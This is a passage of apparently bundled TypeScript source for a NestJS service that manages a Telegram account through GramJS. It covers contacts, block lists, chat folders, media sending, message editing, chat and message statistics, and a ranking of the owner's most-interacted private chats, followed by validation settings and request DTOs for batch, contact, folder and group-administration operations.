      return this.generateVCard(contacts);\n        }\n    }\n\n    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(data.map(async contact => {\n            try {\n                await this.client.invoke(new Api.contacts.ImportContacts({\n                    contacts: [new Api.InputPhoneContact({\n                        clientId: bigInt(Math.floor(Math.random() * 1000000)),\n                        phone: contact.phone,\n                        firstName: contact.firstName,\n                        lastName: contact.lastName || ''\n                    })]\n                }));\n                return { success: true, phone: contact.phone };\n            } catch (error) {\n                return { success: false, phone: contact.phone, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async manageBlockList(userIds: string[], block: boolean) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(userIds.map(async userId => {\n            try {\n                if (block) {\n                    await this.client.invoke(new Api.contacts.Block({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                } else {\n                    await this.client.invoke(new Api.contacts.Unblock({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                }\n                return { success: true, userId };\n            } catch (error) {\n                return { success: false, userId, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async getContactStatistics() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);\n\n        return {\n            total: contacts.length,\n            online: onlineContacts.length,\n            withPhone: contacts.filter((c: any) => c.phone).length,\n            mutual: contacts.filter((c: any) => c.mutual).length,\n            lastWeekActive: onlineContacts.filter((c: any) => {\n                const lastSeen = new Date(c.status.wasOnline * 1000);\n                const weekAgo = new Date();\n                weekAgo.setDate(weekAgo.getDate() - 7);\n                return lastSeen > weekAgo;\n            }).length\n        };\n    }\n\n    // Chat Folder Management\n    async createChatFolder(options: {\n        name: string,\n        includedChats: string[],\n        excludedChats?: string[],\n        includeContacts?: boolean,\n        includeNonContacts?: boolean,\n        includeGroups?: boolean,\n        includeBroadcasts?: boolean,\n        includeBots?: boolean,\n        excludeMuted?: boolean,\n        excludeRead?: boolean,\n        excludeArchived?: boolean\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const folder = new Api.DialogFilter({\n            id: Math.floor(Math.random() * 1000),\n            title: options.name,\n            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),\n            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),\n            pinnedPeers: [],\n            contacts: options.includeContacts ?? true,\n            nonContacts: options.includeNonContacts ?? true,\n            groups: options.includeGroups ?? true,\n            broadcasts: options.includeBroadcasts ?? true,\n            bots: options.includeBots ?? true,\n            excludeMuted: options.excludeMuted ?? false,\n            excludeRead: options.excludeRead ?? false,\n            excludeArchived: options.excludeArchived ?? false\n        });\n\n        await this.client.invoke(new Api.messages.UpdateDialogFilter({\n            id: folder.id,\n            filter: folder\n        }));\n\n        return {\n            id: folder.id,\n            name: options.name,\n            options: {\n                includeContacts: folder.contacts,\n                includeNonContacts: folder.nonContacts,\n                includeGroups: folder.groups,\n                includeBroadcasts: folder.broadcasts,\n                includeBots: folder.bots,\n                excludeMuted: folder.excludeMuted,\n                excludeRead: folder.excludeRead,\n                excludeArchived: folder.excludeArchived\n            }\n        };\n    }\n\n    async getChatFolders() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());\n        return filters.map((filter: any) => ({\n            id: filter.id ?? 0,\n            title: filter.title ?? '',\n            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,\n            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0\n        }));\n    }\n\n    async sendMediaBatch(options: {\n        chatId: string;\n        media: Array<{\n            type: 'photo' | 'video' | 'document';\n            url: string;\n            caption?: string;\n            fileName?: string;\n        }>;\n        silent?: boolean;\n        scheduleDate?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            options.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const file = new CustomFile(\n                    item.fileName || `media.${this.getMediaExtension(item.type)}`,\n                    buffer.length,\n                    'media',\n                    buffer\n                );\n\n                const uploadedFile = await this.client.uploadFile({\n                    file,\n                    workers: 1\n                });\n\n                const inputMedia = item.type === 'photo' ?\n                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                    new Api.InputMediaUploadedDocument({\n                        file: uploadedFile,\n                        mimeType: this.getMimeType(item.type),\n                        attributes: this.getMediaAttributes(item)\n                    });\n\n                return new Api.InputSingleMedia({\n                    media: inputMedia,\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: options.chatId,\n            multiMedia: mediaFiles,\n            silent: options.silent,\n            scheduleDate: options.scheduleDate\n        }));\n    }\n\n    private getMimeType(type: string): string {\n        switch (type) {\n            case 'photo': return 'image/jpeg';\n            case 'video': return 'video/mp4';\n            case 'document': return 'application/octet-stream';\n            default: return 'application/octet-stream';\n        }\n    }\n\n    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {\n        const attributes: Api.TypeDocumentAttribute[] = [];\n\n        if (item.fileName) {\n            attributes.push(new Api.DocumentAttributeFilename({\n                fileName: item.fileName\n            }));\n        }\n\n        if (item.type === 'video') {\n            attributes.push(new Api.DocumentAttributeVideo({\n                duration: 0,\n                w: 1280,\n                h: 720,\n                supportsStreaming: true\n            }));\n        }\n\n        return attributes;\n    }\n\n    async editMessage(options: {\n        chatId: string;\n        messageId: number;\n        text?: string;\n        media?: {\n            type: 'photo' | 'video' | 'document';\n            url: string;\n        };\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.media) {\n            const buffer = await this.downloadFileFromUrl(options.media.url);\n            const file = new CustomFile(\n                `media.${this.getMediaExtension(options.media.type)}`,\n                buffer.length,\n                'media',\n                buffer\n            );\n\n            const uploadedFile = await this.client.uploadFile({\n                file,\n                workers: 1\n            });\n\n            const inputMedia = options.media.type === 'photo' ?\n                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                new Api.InputMediaUploadedDocument({\n                    file: uploadedFile,\n                    mimeType: this.getMimeType(options.media.type),\n                    attributes: this.getMediaAttributes(options.media)\n                });\n\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                media: inputMedia,\n                message: options.text || ''\n            }));\n        }\n\n        if (options.text) {\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                message: options.text\n            }));\n        }\n\n        throw new Error('Either text or media must be provided');\n    }\n\n    async getChats(options: {\n        limit?: number;\n        offsetDate?: number;\n        offsetId?: number;\n        offsetPeer?: string;\n        folderId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const dialogs = await this.client.getDialogs({\n            ...options,\n            limit: options.limit || 100\n        });\n\n        return Promise.all(dialogs.map(async (dialog) => {\n            const entity = dialog.entity;\n            return {\n                id: entity.id.toString(),\n                title: 'title' in entity ? entity.title : null,\n                username: 'username' in entity ? entity.username : null,\n                type: entity instanceof Api.User ? 'user' :\n                    entity instanceof Api.Chat ? 'group' :\n                        entity instanceof Api.Channel ? 'channel' : 'unknown',\n                unreadCount: dialog.unreadCount,\n                lastMessage: dialog.message ? {\n                    id: dialog.message.id,\n                    text: dialog.message.message,\n                    date: new Date(dialog.message.date * 1000)\n                } : null\n            };\n        }));\n    }\n\n    async updateChatSettings(settings: {\n        chatId: string;\n        username?: string;\n        title?: string;\n        about?: string;\n        photo?: string;\n        slowMode?: number;\n        linkedChat?: string;\n        defaultSendAs?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const chat = await this.client.getEntity(settings.chatId);\n\n        const updates: Promise<any>[] = [];\n\n        if (settings.title) {\n            updates.push(this.client.invoke(new Api.channels.EditTitle({\n                channel: chat,\n                title: settings.title\n            })));\n        }\n\n        if (settings.about) {\n            updates.push(this.client.invoke(new Api.messages.EditChatAbout({\n                peer: chat,\n                about: settings.about\n            })));\n        }\n\n        if (settings.photo) {\n            const buffer = await this.downloadFileFromUrl(settings.photo);\n            const file = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            updates.push(this.client.invoke(new Api.channels.EditPhoto({\n                channel: chat,\n                photo: new Api.InputChatUploadedPhoto({\n                    file: file\n                })\n            })));\n        }\n\n        if (settings.slowMode !== undefined) {\n            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: chat,\n                seconds: settings.slowMode\n            })));\n        }\n\n        if (settings.linkedChat) {\n            const linkedChannel = await this.client.getEntity(settings.linkedChat);\n            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({\n                broadcast: chat,\n                group: linkedChannel\n            })));\n        }\n\n        if (settings.username) {\n            updates.push(this.client.invoke(new Api.channels.UpdateUsername({\n                channel: chat,\n                username: settings.username\n            })));\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getMessageStats(options: {\n        chatId: string;\n        period: 'day' | 'week' | 'month';\n        fromDate?: Date;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = options.fromDate || new Date();\n        const startDate = new Date(now);\n\n        switch (options.period) {\n            case 'day':\n                startDate.setDate(startDate.getDate() - 1);\n                break;\n            case 'week':\n                startDate.setDate(startDate.getDate() - 7);\n                break;\n            case 'month':\n                startDate.setMonth(startDate.getMonth() - 1);\n                break;\n        }\n\n        const messages = await this.client.getMessages(options.chatId, {\n            limit: 100,\n            offsetDate: Math.floor(now.getTime() / 1000),\n        });\n\n        const stats = {\n            total: messages.length,\n            withMedia: 0,\n            withLinks: 0,\n            withForwards: 0,\n            byHour: new Array(24).fill(0),\n            byType: {\n                text: 0,\n                photo: 0,\n                video: 0,\n                document: 0,\n                other: 0\n            }\n        };\n\n        for (const msg of messages) {\n            const hour = new Date(msg.date * 1000).getHours();\n            stats.byHour[hour]++;\n\n            if (msg.media) {\n                stats.withMedia++;\n                const mediaType = this.getMediaType(msg.media);\n                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\n            } else if (msg.message) {\n                if (msg.message.match(/https?:\\/\\/[^\\s]+/)) {\n                    stats.withLinks++;\n                }\n                stats.byType.text++;\n            }\n\n            if (msg.fwdFrom) {\n                stats.withForwards++;\n            }\n        }\n\n        return stats;\n    }\n\n    async getTopPrivateChats(): Promise<Array<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        console.log('Starting getTopPrivateChats analysis...');\n        const startTime = Date.now();\n\n        // Weighting factors for different interaction types\n        const weights = {\n            videoCall: 15,      // Video calls have highest weight due to high engagement\n            audioCall: 8,       // Audio calls indicate strong connection\n            sharedVideo: 6,     // Videos show high interaction intent\n            sharedPhoto: 4,     // Photos show moderate interaction\n            textMessage: 1,     // Base weight for messages\n            recentActivityBonus: 1.5  // Bonus multiplier for recent activity\n        };\n\n        console.log('Fetching dialogs...');\n        const dialogs = await this.client.getDialogs({\n            limit: 200 // Reduced from 500 for better performance\n        });\n        console.log(`Found ${dialogs.length} total dialogs`);\n\n        // Filter private chats more strictly\n        const privateChats = dialogs.filter(dialog =>\n            dialog.isUser &&\n            dialog.entity instanceof Api.User &&\n            !dialog.entity.bot && // Explicitly exclude bots\n            !dialog.entity.deleted && // Exclude deleted accounts\n            !dialog.entity.fake && // Exclude fake accounts\n            dialog.entity.id.toString() !== \"777000\" && // Exclude Telegram's service notifications\n            dialog.entity.id.toString() !== \"42777\" // Exclude Telegram's support account\n        );\n\n        console.log(`Found ${privateChats.length} valid private chats after filtering`);\n\n        // Calculate recent activity window (last month)\n        const now = Math.floor(Date.now() / 1000);\n        // const oneMonthAgo = now - (30 * 24 * 60 * 60);\n\n        // Process chats in batches to avoid overwhelming the API\n        const batchSize = 10;\n        const chatStats = [];\n\n        for (let i = 0; i < privateChats.length; i += batchSize) {\n            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);\n            const batch = privateChats.slice(i, i + batchSize);\n\n            const batchResults = await Promise.all(batch.map(async (dialog) => {\n                const processingStart = Date.now();\n                const chatId = dialog.entity.id.toString();\n                const user = dialog.entity as Api.User;\n\n                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'})`);\n\n                try {\n                    // Get recent messages with optimization\n                    const messages = await this.client.getMessages(chatId, {\n                        limit: 500,\n                        // offsetDate: oneMonthAgo\n                    });\n\n                    // Skip chats with fewer than 20 messages\n                    if (messages.length < 20) {\n                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length})`);\n                        return null;\n                    }\n\n                    console.log(`Retrieved ${messages.length} messages for chat ${chatId}`);\n\n                    const callStats = {\n                        total: 0,\n                        incoming: { total: 0, audio: 0, video: 0 },\n                        outgoing: { total: 0, audio: 0, video: 0 }\n                    };\n\n                    const mediaStats = { photos: 0, videos: 0 };\n                    let recentActivityScore = 0;\n\n                    // Optimize message processing with a single loop\n                    for (const message of messages) {\n                        const messageAge = now - message.date;\n                        const recencyMultiplier = 1 + (1 - messageAge / (30 * 24 * 60 * 60));\n\n                        if (message.action instanceof Api.MessageActionPhoneCall) {\n                            const call = message.action;\n                            callStats.total++;\n\n                            if (message.out) {\n                                callStats.outgoing.total++;\n                                call.video ? callStats.outgoing.video++ : callStats.outgoing.audio++;\n                            } else {\n                                callStats.incoming.total++;\n                                call.video ? callStats.incoming.video++ : callStats.incoming.audio++;\n                            }\n                        }\n\n                        if (message.media) {\n                            if (message.media instanceof Api.MessageMediaPhoto) {\n                                mediaStats.photos++;\n                            } else if (message.media instanceof Api.MessageMediaDocument &&\n                                message.media.document instanceof Api.Document &&\n                                message.media.document.mimeType?.startsWith('video/')) {\n                                mediaStats.videos++;\n                            }\n                        }\n\n                        recentActivityScore += recencyMultiplier;\n                    }\n\n                    // Calculate scores\n                    const interactionScore = (\n                        (callStats.incoming.video + callStats.outgoing.video) * weights.videoCall +\n                        (callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall +\n                        mediaStats.videos * weights.sharedVideo +\n                        mediaStats.photos * weights.sharedPhoto +\n                        messages.length * weights.textMessage\n                    ) * (recentActivityScore * weights.recentActivityBonus);\n\n                    // Calculate activity breakdown\n                    const activityBreakdown = {\n                        videoCalls: ((callStats.incoming.video + callStats.outgoing.video) * weights.videoCall) / interactionScore * 100,\n                        audioCalls: ((callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall) / interactionScore * 100,\n                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,\n                        textMessages: (messages.length * weights.textMessage) / interactionScore * 100\n                    };\n\n                    const processingTime = Date.now() - processingStart;\n                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);\n\n                    return {\n                        chatId,\n                        username: user.username,\n                        firstName: user.firstName,\n                        lastName: user.lastName,\n                        totalMessages: messages.length,\n                        interactionScore: Math.round(interactionScore * 100) / 100,\n                        calls: callStats,\n                        media: mediaStats,\n                        activityBreakdown\n                    };\n                } catch (error) {\n                    console.error(`Error processing chat ${chatId}:`, error);\n                    return null;\n                }\n            }));\n\n            chatStats.push(...batchResults.filter(Boolean));\n        }\n\n        // Sort by interaction score and get top 5\n        const topChats = chatStats\n            .sort((a, b) => b.interactionScore - a.interactionScore)\n            .slice(0, 5);\n\n        const totalTime = Date.now() - startTime;\n        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);\n        topChats.forEach((chat, index) => {\n            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);\n        });\n\n        return topChats;\n    }\n}\nexport default TelegramManager;\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  @ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class ConnectionStatusDto {\r\n  @ApiProperty({ description: 'Number of active connections' })\r\n  activeConnections: number;\r\n\r\n  @ApiProperty({ description: 'Number of rate-limited connections' })\r\n  rateLimited: number;\r\n\r\n  @ApiProperty({ description: 'Total number of operations' })\r\n  totalOperations: number;\r\n}\r\nexport class ChatStatisticsDto {\r\n  @ApiProperty({ description: 'Total message count' })\r\n  totalMessages: number;\r\n\r\n  @ApiProperty({ description: 'Active member count' })\r\n  activeMembers: number;\r\n\r\n  @ApiProperty({ description: 'Message count by type' })\r\n  messageTypes: {\r\n    text: number;\r\n    photo: number;\r\n    video: number;\r\n    voice: number;\r\n    document: number;\r\n  };\r\n\r\n  @ApiProperty({ description: 'Most active hours', type: [Number] })\r\n  activeHours: number[];\r\n\r\n  @ApiProperty({ description: 'Activity trend percentage' })\r\n  activityTrend: number;\r\n}","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS = 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiPropertyOptional({ description: 'Group title', required: false })\r\n  @IsString()\r\n  @IsOptional()\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group username', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  